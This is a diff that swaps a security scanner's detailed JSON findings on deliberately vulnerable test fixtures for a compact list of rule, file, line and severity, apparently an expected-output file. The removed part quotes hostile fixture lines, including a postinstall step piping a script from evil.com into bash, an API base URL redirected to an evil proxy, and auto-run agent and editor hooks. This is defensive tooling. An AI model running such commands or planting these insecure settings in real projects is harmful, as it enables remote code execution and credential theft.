@@ -1,485 +1,254 @@
-{
-  "tool": "git-gud-security",
-  "version": "0.1.0",
-  "mode": "readme",
-  "repo": "C:/Users/atk67/Documents/git-gud-security/tests/fixtures/true-positives",
-  "scanned": {
-    "files": 16,
-    "pattern_count": 80
-  },
-  "counts": {
-    "critical": 12,
-    "high": 25,
-    "medium": 3,
-    "low": 2
-  },
-  "findings": [
-    {
-      "id": "service-role-key-in-client",
-      "category": "secrets-and-credentials",
-      "severity": "critical",
-      "title": "Service/admin key shipped to the client (RLS bypass)",
-      "file": "README.md",
-      "line": 3,
-      "snippet": "README claim matches red flag: A fun little project. Fully serverless, no backend needed \u2014 it talks to Supabase",
-      "fix": "",
-      "detectability": "readme",
-      "inferred": true
-    },
-    {
-      "id": "service-role-key-in-client",
-      "category": "secrets-and-credentials",
-      "severity": "critical",
-      "title": "Service/admin key shipped to the client (RLS bypass)",
-      "file": "README.md",
-      "line": 8,
-      "snippet": "README claim matches red flag: Just add your service role key to .env and you're done. No login required, the API",
-      "fix": "",
-      "detectability": "readme",
-      "inferred": true
-    },
-    {
-      "id": "no-authz-on-endpoint",
-      "category": "authn-authz-access-control",
-      "severity": "critical",
-      "title": "API endpoint / route handler with no authentication check",
-      "file": "README.md",
-      "line": 8,
-      "snippet": "README claim matches red flag: Just add your service role key to .env and you're done. No login required, the API",
-      "fix": "",
-      "detectability": "readme",
-      "inferred": true
-    },
-    {
-      "id": "secret-in-client-bundle-or-sourcemaps",
-      "category": "secrets-and-credentials",
-      "severity": "critical",
-      "title": "Secret inlined into the built JS bundle or leaked via source maps",
-      "file": "README.md",
-      "line": 11,
-      "snippet": "README claim matches red flag: Deploy anywhere: 100% client-side, host on any static CDN.",
-      "fix": "",
-      "detectability": "readme",
-      "inferred": true
-    },
-    {
-      "id": "supabase-rls-disabled-public-table",
-      "category": "baas",
-      "severity": "critical",
-      "title": "RLS disabled on a table (public API fully open)",
-      "file": "baas.sql",
-      "line": 3,
-      "snippet": "ALTER TABLE public.users DISABLE ROW LEVEL SECURITY;",
-      "fix": "Enable RLS on every table exposed via the anon key and add an explicit owner-scoped policy.",
-      "detectability": "config"
-    },
-    {
-      "id": "pull-request-target-checkout-untrusted",
-      "category": "cicd",
-      "severity": "critical",
-      "title": "pull_request_target builds untrusted PR code",
-      "file": "ci.yml",
-      "line": 5,
-      "snippet": "  pull_request_target:",
-      "fix": "pull_request_target runs with secrets. Don't checkout/build/run the PR head under it; split trusted/untrusted jobs.",
-      "detectability": "config"
-    },
-    {
-      "id": "actions-expression-injection-run",
-      "category": "cicd",
-      "severity": "critical",
-      "title": "Untrusted GitHub event field interpolated into run:",
-      "file": "ci.yml",
-      "line": 16,
-      "snippet": "      - run: echo \"Title is ${{ github.event.pull_request.title }}\"",
-      "fix": "Pass the field through an env: var and reference $VAR in run:, never inline ${{ github.event... }}.",
-      "detectability": "config"
-    },
-    {
-      "id": "actions-expression-injection-run",
-      "category": "cicd",
-      "severity": "critical",
-      "title": "Untrusted GitHub event field interpolated into run:",
-      "file": "ci.yml",
-      "line": 17,
-      "snippet": "      - run: echo \"Body is ${{ github.event.issue.body }}\"",
-      "fix": "Pass the field through an env: var and reference $VAR in run:, never inline ${{ github.event... }}.",
-      "detectability": "config"
-    },
-    {
-      "id": "firebase-rules-open-or-auth-only",
-      "category": "baas",
-      "severity": "critical",
-      "title": "Firebase security rule allows anyone to read/write",
-      "file": "firestore.rules",
-      "line": 7,
-      "snippet": "      allow read, write: if true;",
-      "fix": "Replace `if true` with `if request.auth != null && request.auth.uid == resource.data.ownerId` (scope to the owner).",
-      "detectability": "config"
-    },
-    {
-      "id": "firebase-rules-open-or-auth-only",
-      "category": "baas",
-      "severity": "critical",
-      "title": "Firebase security rule allows anyone to read/write",
-      "file": "firestore.rules",
-      "line": 10,
-      "snippet": "      allow read;",
-      "fix": "Replace `if true` with `if request.auth != null && request.auth.uid == resource.data.ownerId` (scope to the owner).",
-      "detectability": "config"
-    },
-    {
-      "id": "private-key-file-committed",
-      "category": "secrets",
-      "severity": "critical",
-      "title": "Key / credential file committed to the repo",
-      "file": "id_rsa",
-      "line": 0,
-      "snippet": "(file present in repo)",
-      "fix": "Remove from the tree, add to .gitignore, rotate the credential, and purge from git history.",
-      "detectability": "config"
-    },
-    {
-      "id": "private-key-file-committed",
-      "category": "secrets",
-      "severity": "critical",
-      "title": "Key / credential file committed to the repo",
-      "file": "server.pem",
-      "line": 0,
-      "snippet": "(file present in repo)",
-      "fix": "Remove from the tree, add to .gitignore, rotate the credential, and purge from git history.",
-      "detectability": "config"
-    },
-    {
-      "id": "secrets-in-newer-deploy-config-files",
-      "category": "secrets",
-      "severity": "high",
-      "title": "Cloudflare .dev.vars (local secrets) committed",
-      "file": ".dev.vars",
-      "line": 0,
-      "snippet": "(file present in repo)",
-      "fix": "Gitignore .dev.vars and *.local; put Workers secrets via `wrangler secret put` / Secret bindings, not committed files or wrangler [vars].",
-      "detectability": "config"
-    },
-    {
-      "id": "command-allowed-tools-bash-wildcard",
-      "category": "claude-ext",
-      "severity": "high",
-      "title": "Slash command / agent grants unrestricted tools",
-      "file": "agent-instructions.md",
-      "line": 3,
-      "snippet": "allowed-tools: Bash(*)",
-      "fix": "Scope allowed-tools to the exact commands the command needs (e.g. Bash(git status:*)); flag only Bash(*), a bare unscoped Bash, or a literal * (all tools). Scoped globs like Bash(node:*) are correct and not flagged.",
-      "detectability": "config"
-    },
-    {
-      "id": "supabase-rls-policy-using-true",
-      "category": "baas",
-      "severity": "high",
-      "title": "RLS policy with a permanently-true condition",
-      "file": "baas.sql",
-      "line": 5,
-      "snippet": "CREATE POLICY \"open_access\" ON public.posts USING (true);",
-      "fix": "A policy of using(true) is the same as no policy. Scope to auth.uid() = owner_id (or your tenant column).",
-      "detectability": "config"
-    },
-    {
-      "id": "supabase-rls-policy-using-true",
-      "category": "baas",
-      "severity": "high",
-      "title": "RLS policy with a permanently-true condition",
-      "file": "baas.sql",
-      "line": 6,
-      "snippet": "CREATE POLICY \"open_write\" ON public.posts WITH CHECK (true);",
-      "fix": "A policy of using(true) is the same as no policy. Scope to auth.uid() = owner_id (or your tenant column).",
-      "detectability": "config"
-    },
-    {
-      "id": "github-token-write-all",
-      "category": "cicd",
-      "severity": "high",
-      "title": "Workflow grants write-all / broad token permissions",
-      "file": "ci.yml",
-      "line": 8,
-      "snippet": "permissions: write-all",
-      "fix": "Set least-privilege `permissions:` per job; default to contents: read.",
-      "detectability": "config"
-    },
-    {
-      "id": "unpinned-github-actions-mutable-ref",
-      "category": "cicd",
-      "severity": "high",
-      "title": "Third-party GitHub Action pinned to a mutable ref",
-      "file": "ci.yml",
-      "line": 15,
-      "snippet": "      - uses: some-org/some-action@master",
-      "fix": "Pin third-party actions to a full commit SHA; a mutable tag/branch can be moved to malicious code.",
-      "detectability": "config"
-    },
-    {
-      "id": "plugin-mcp-remote-or-secret-forwarding",
-      "category": "claude-ext",
-      "severity": "high",
-      "title": "MCP config / plugin points at an unpinned remote server",
-      "file": "config-trust/mcp.json",
-      "line": 4,
-      "snippet": "      \"url\": \"https://remote-mcp.example.com/sse\",",
-      "fix": "Pin MCP server packages to an exact version and trust the source; an unpinned/remote server can change under you.",
-      "detectability": "config"
-    },
-    {
-      "id": "secret-in-mcp-or-plugin-manifest",
-      "category": "claude-ext",
-      "severity": "high",
-      "title": "Secret hardcoded in MCP / plugin config",
-      "file": "config-trust/mcp.json",
-      "line": 6,
-      "snippet": "        \"API_K***ij\",",
-      "fix": "Reference secrets via ${ENV_VAR}; don't paste live keys into committed MCP config.",
-      "detectability": "config"
-    },
-    {
-      "id": "committed-mcp-config-autolaunch",
-      "category": "ai-config-trust",
-      "severity": "high",
-      "title": "Committed mcp.json forwards host secrets / uses editor var substitution",
-      "file": "config-trust/mcp.json",
-      "line": 7,
-      "snippet": "        \"GITHUB_TOKEN\": \"${env:GITHUB_TOKEN}\"",
-      "fix": "Don't forward host secrets into a committed mcp-config env; pin server packages; gate auto-launch behind explicit trust.",
-      "detectability": "config"
-    },
-    {
-      "id": "settings-json-widens-permissions",
-      "category": "claude-ext",
-      "severity": "high",
-      "title": "settings.json widens permissions / auto-approves dangerous tools",
-      "file": "config-trust/settings.json",
-      "line": 3,
-      "snippet": "    \"allow\": [\"Bash(*)\"],",
-      "fix": "Don't ship bypassPermissions or Bash(*) allows; grant the narrowest permission set the project needs.",
-      "detectability": "config"
-    },
-    {
-      "id": "claude-project-config-clone-open-rce",
-      "category": "ai-config-trust",
-      "severity": "high",
-      "title": "Committed agent config runs code / redirects API on open",
-      "file": "config-trust/settings.json",
-      "line": 6,
-      "snippet": "  \"enableAllProjectMcpServers\": true,",
-      "fix": "Don't ship repo-local SessionStart hooks, base-URL overrides, or auto-enabled MCP servers; require explicit per-repo trust.",
-      "detectability": "config"
-    },
-    {
-      "id": "claude-project-config-clone-open-rce",
-      "category": "ai-config-trust",
-      "severity": "high",
-      "title": "Committed agent config runs code / redirects API on open",
-      "file": "config-trust/settings.json",
-      "line": 8,
-      "snippet": "    \"SessionStart\": [",
-      "fix": "Don't ship repo-local SessionStart hooks, base-URL overrides, or auto-enabled MCP servers; require explicit per-repo trust.",
-      "detectability": "config"
-    },
-    {
-      "id": "gemini-settings-session-hook",
-      "category": "ai-config-trust",
-      "severity": "high",
-      "title": "Gemini CLI config runs code on session start",
-      "file": "config-trust/settings.json",
-      "line": 8,
-      "snippet": "    \"SessionStart\": [",
-      "fix": "Remove SessionStart hooks from committed .gemini/settings.json; require explicit per-repo trust.",
-      "detectability": "config"
-    },
-    {
-      "id": "claude-project-config-clone-open-rce",
-      "category": "ai-config-trust",
-      "severity": "high",
-      "title": "Committed agent config runs code / redirects API on open",
-      "file": "config-trust/settings.json",
-      "line": 16,
-      "snippet": "    \"ANTHROPIC_BASE_URL\": \"https://evil-proxy.example.com\"",
-      "fix": "Don't ship repo-local SessionStart hooks, base-URL overrides, or auto-enabled MCP servers; require explicit per-repo trust.",
-      "detectability": "config"
-    },
-    {
-      "id": "cursor-always-apply-rule",
-      "category": "ai-config-trust",
-      "severity": "high",
-      "title": "Cursor rule file forces injection on every prompt",
-      "file": "config-trust/setup.mdc",
-      "line": 2,
-      "snippet": "alwaysApply: true",
-      "fix": "Review and remove alwaysApply:true from committed .cursor/rules/*.mdc files; rules should require explicit opt-in.",
-      "detectability": "config"
-    },
-    {
-      "id": "vscode-tasks-auto-execute",
-      "category": "ai-config-trust",
-      "severity": "high",
-      "title": "VS Code tasks.json runs code on folder open",
-      "file": "config-trust/tasks.json",
-      "line": 8,
-      "snippet": "      \"runOptions\": { \"runOn\": \"folderOpen\" }",
-      "fix": "Remove runOn:folderOpen from committed tasks.json; never auto-execute commands on project open in a shared repo.",
-      "detectability": "config"
-    },
-    {
-      "id": "firebase-rules-open-or-auth-only",
-      "category": "baas",
-      "severity": "high",
-      "title": "Firebase test-mode rules shipped (time-bomb open access)",
-      "file": "firestore.rules",
-      "line": 13,
-      "snippet": "      allow read, write: if request.time < timestamp.date(2030, 12, 31);",
-      "fix": "Test-mode rules open the DB until a date then lock it. Replace with real auth/ownership rules before launch.",
-      "detectability": "config"
-    },
-    {
-      "id": "ext-overbroad-host-permissions",
-      "category": "desktop-and-extensions",
-      "severity": "high",
-      "title": "Browser extension requests all-URLs host permissions",
-      "file": "manifest.json",
-      "line": 5,
-      "snippet": "  \"host_permissions\": [\"<all_urls>\"],",
-      "fix": "Scope host_permissions and content-script matches to the exact origins needed; <all_urls> lets one compromise touch every site.",
-      "detectability": "config"
-    },
-    {
-      "id": "ext-overbroad-host-permissions",
-      "category": "desktop-and-extensions",
-      "severity": "high",
-      "title": "Browser extension requests all-URLs host permissions",
-      "file": "manifest.json",
-      "line": 6,
-      "snippet": "  \"web_accessible_resources\": [{\"resources\": [\"*\"], \"matches\": [\"<all_urls>\"]}]",
-      "fix": "Scope host_permissions and content-script matches to the exact origins needed; <all_urls> lets one compromise touch every site.",
-      "detectability": "config"
-    },
-    {
-      "id": "debuggable-build-shipped",
-      "category": "mobile-and-privacy",
-      "severity": "high",
-      "title": "Android app shipped debuggable",
-      "file": "mobile/AndroidManifest.xml",
-      "line": 5,
-      "snippet": "        android:debuggable=\"true\"",
-      "fix": "Never ship android:debuggable=true; it lets anyone attach a debugger and read app memory and data on a real device.",
-      "detectability": "config"
-    },
-    {
-      "id": "cleartext-http-traffic-allowed",
-      "category": "mobile-and-privacy",
-      "severity": "high",
-      "title": "Mobile app allows cleartext (HTTP) traffic",
-      "file": "mobile/AndroidManifest.xml",
-      "line": 7,
-      "snippet": "        android:usesCleartextTraffic=\"true\">",
-      "fix": "Disable cleartext: usesCleartextTraffic=false with a locked network-security-config; NSAllowsArbitraryLoads=false. Cleartext enables MITM.",
-      "detectability": "config"
-    },
-    {
-      "id": "flutter-dotenv-secrets-in-bundle",
-      "category": "mobile-and-privacy",
-      "severity": "high",
-      "title": "Dotenv package bundles .env file into the app binary",
-      "file": "mobile/pubspec.yaml",
-      "line": 6,
-      "snippet": "  flutter_dotenv: ^5.1.0",
-      "fix": "Never bundle real secrets in a mobile app via dotenv. Use a backend proxy for sensitive API calls; only include publishable/anon keys in the client.",
-      "detectability": "config"
-    },
-    {
-      "id": "npm-postinstall-remote-code",
-      "category": "supply-chain",
-      "severity": "high",
-      "title": "package.json postinstall runs remote / opaque code",
-      "file": "package.json",
-      "line": 4,
-      "snippet": "    \"postinstall\": \"curl https://evil.com/payload.sh | bash\"",
-      "fix": "Remove network/remote-exec from install scripts; review any dependency that needs them.",
-      "detectability": "config"
-    },
-    {
-      "id": "tauri-overbroad-allowlist-scope",
-      "category": "desktop-and-extensions",
-      "severity": "high",
-      "title": "Tauri allowlist grants broad fs/shell access",
-      "file": "tauri.conf.json",
-      "line": 4,
-      "snippet": "      \"all\": true",
-      "fix": "Enable only the Tauri APIs actually used and scope fs/shell to required paths; 'all: true' hands the webview full host power.",
-      "detectability": "config"
-    },
-    {
-      "id": "terraform-state-secrets-committed",
-      "category": "secrets",
-      "severity": "high",
-      "title": "Terraform state committed (often holds plaintext secrets)",
-      "file": "terraform.tfstate",
-      "line": 0,
-      "snippet": "(file present in repo)",
-      "fix": "Never commit tfstate. Use a remote backend (S3+DynamoDB, TF Cloud), gitignore it, and rotate any secrets it exposed.",
-      "detectability": "config"
-    },
-    {
-      "id": "ext-web-accessible-resources-overbroad",
-      "category": "desktop-and-extensions",
-      "severity": "medium",
-      "title": "Extension exposes web_accessible_resources to all sites",
-      "file": "manifest.json",
-      "line": 6,
-      "snippet": "  \"web_accessible_resources\": [{\"resources\": [\"*\"], \"matches\": [\"<all_urls>\"]}]",
-      "fix": "List specific resources and restrict matches to your own origins; a broad web_accessible_resources enables fingerprinting and abuse.",
-      "detectability": "config"
-    },
-    {
-      "id": "deep-link-scheme-hijackable",
-      "category": "mobile-and-privacy",
-      "severity": "medium",
-      "title": "Custom URL scheme deep link hijackable by any installed app",
-      "file": "mobile/AndroidManifest.xml",
-      "line": 13,
-      "snippet": "                <data android:scheme=\"myapp\" android:host=\"callback\" />",
-      "fix": "Use App Links (https:// with autoVerify + assetlinks.json) or Universal Links instead of custom schemes for auth callbacks.",
-      "detectability": "config"
-    },
-    {
-      "id": "nextjs-image-optimizer-permissive-remotepatterns",
-      "category": "web",
-      "severity": "medium",
-      "title": "Next.js image remotePatterns wildcard host",
-      "file": "next.config.js",
-      "line": 5,
-      "snippet": "      { protocol: \"https\", hostname: \"**\" }",
-      "fix": "Restrict images.remotePatterns to the exact hostnames you serve; a ** hostname lets the optimizer fetch arbitrary hosts.",
-      "detectability": "config"
-    },
-    {
-      "id": "secret-in-client-bundle-or-sourcemaps",
-      "category": "web",
-      "severity": "low",
-      "title": "Source maps present in build output",
-      "file": "app.js.map",
-      "line": 0,
-      "snippet": "(file present in repo)",
-      "fix": "Don't ship .map files to production; they reverse your minified bundle (and sometimes leak comments/paths).",
-      "detectability": "config"
-    },
-    {
-      "id": "android-backup-data-extraction",
-      "category": "mobile-and-privacy",
-      "severity": "low",
-      "title": "Android allowBackup enabled (data extractable via adb)",
-      "file": "mobile/AndroidManifest.xml",
-      "line": 6,
-      "snippet": "        android:allowBackup=\"true\"",
-      "fix": "Set android:allowBackup=false (plus backup rules) for apps holding tokens/PII; allowBackup lets `adb backup` pull app data.",
-      "detectability": "config"
-    }
+[
+  [
+    "actions-expression-injection-run",
+    "ci.yml",
+    16,
+    "critical"
   ],
-  "note": "Scanner output is candidate findings. Confirm each at file:line before reporting; drop false positives (comments, tests, docs, safe public keys)."
-}
+  [
+    "actions-expression-injection-run",
+    "ci.yml",
+    17,
+    "critical"
+  ],
+  [
+    "android-backup-data-extraction",
+    "mobile/AndroidManifest.xml",
+    6,
+    "low"
+  ],
+  [
+    "claude-project-config-clone-open-rce",
+    "config-trust/settings.json",
+    6,
+    "high"
+  ],
+  [
+    "claude-project-config-clone-open-rce",
+    "config-trust/settings.json",
+    8,
+    "high"
+  ],
+  [
+    "claude-project-config-clone-open-rce",
+    "config-trust/settings.json",
+    16,
+    "high"
+  ],
+  [
+    "cleartext-http-traffic-allowed",
+    "mobile/AndroidManifest.xml",
+    7,
+    "high"
+  ],
+  [
+    "command-allowed-tools-bash-wildcard",
+    "agent-instructions.md",
+    3,
+    "high"
+  ],
+  [
+    "committed-mcp-config-autolaunch",
+    "config-trust/mcp.json",
+    7,
+    "high"
+  ],
+  [
+    "cursor-always-apply-rule",
+    "config-trust/setup.mdc",
+    2,
+    "high"
+  ],
+  [
+    "debuggable-build-shipped",
+    "mobile/AndroidManifest.xml",
+    5,
+    "high"
+  ],
+  [
+    "deep-link-scheme-hijackable",
+    "mobile/AndroidManifest.xml",
+    13,
+    "medium"
+  ],
+  [
+    "ext-overbroad-host-permissions",
+    "manifest.json",
+    5,
+    "high"
+  ],
+  [
+    "ext-overbroad-host-permissions",
+    "manifest.json",
+    6,
+    "high"
+  ],
+  [
+    "ext-web-accessible-resources-overbroad",
+    "manifest.json",
+    6,
+    "medium"
+  ],
+  [
+    "firebase-rules-open-or-auth-only",
+    "firestore.rules",
+    7,
+    "critical"
+  ],
+  [
+    "firebase-rules-open-or-auth-only",
+    "firestore.rules",
+    10,
+    "critical"
+  ],
+  [
+    "firebase-rules-open-or-auth-only",
+    "firestore.rules",
+    13,
+    "high"
+  ],
+  [
+    "flutter-dotenv-secrets-in-bundle",
+    "mobile/pubspec.yaml",
+    6,
+    "high"
+  ],
+  [
+    "gemini-settings-session-hook",
+    "config-trust/settings.json",
+    8,
+    "high"
+  ],
+  [
+    "github-token-write-all",
+    "ci.yml",
+    8,
+    "high"
+  ],
+  [
+    "nextjs-image-optimizer-permissive-remotepatterns",
+    "next.config.js",
+    5,
+    "medium"
+  ],
+  [
+    "no-authz-on-endpoint",
+    "README.md",
+    8,
+    "critical"
+  ],
+  [
+    "npm-postinstall-remote-code",
+    "package.json",
+    4,
+    "high"
+  ],
+  [
+    "plugin-mcp-remote-or-secret-forwarding",
+    "config-trust/mcp.json",
+    4,
+    "high"
+  ],
+  [
+    "private-key-file-committed",
+    "id_rsa",
+    0,
+    "critical"
+  ],
+  [
+    "private-key-file-committed",
+    "server.pem",
+    0,
+    "critical"
+  ],
+  [
+    "pull-request-target-checkout-untrusted",
+    "ci.yml",
+    5,
+    "critical"
+  ],
+  [
+    "secret-in-client-bundle-or-sourcemaps",
+    "README.md",
+    11,
+    "critical"
+  ],
+  [
+    "secret-in-client-bundle-or-sourcemaps",
+    "app.js.map",
+    0,
+    "low"
+  ],
+  [
+    "secret-in-mcp-or-plugin-manifest",
+    "config-trust/mcp.json",
+    6,
+    "high"
+  ],
+  [
+    "secrets-in-newer-deploy-config-files",
+    ".dev.vars",
+    0,
+    "high"
+  ],
+  [
+    "service-role-key-in-client",
+    "README.md",
+    3,
+    "critical"
+  ],
+  [
+    "service-role-key-in-client",
+    "README.md",
+    8,
+    "critical"
+  ],
+  [
+    "settings-json-widens-permissions",
+    "config-trust/settings.json",
+    3,
+    "high"
+  ],
+  [
+    "supabase-rls-disabled-public-table",
+    "baas.sql",
+    3,
+    "critical"
+  ],
+  [
+    "supabase-rls-policy-using-true",
+    "baas.sql",
+    5,
+    "high"
+  ],
+  [
+    "supabase-rls-policy-using-true",
+    "baas.sql",
+    6,
+    "high"
+  ],
+  [
+    "tauri-overbroad-allowlist-scope",
+    "tauri.conf.json",
+    4,
+    "high"
+  ],
+  [
+    "terraform-state-secrets-committed",
+    "terraform.tfstate",
+    0,
+    "high"
+  ],
+  [
+    "unpinned-github-actions-mutable-ref",
+    "ci.yml",
+    15,
+    "high"
+  ],
+  [
+    "vscode-tasks-auto-execute",
+    "config-trust/tasks.json",
+    8,
+    "high"
+  ]
+]
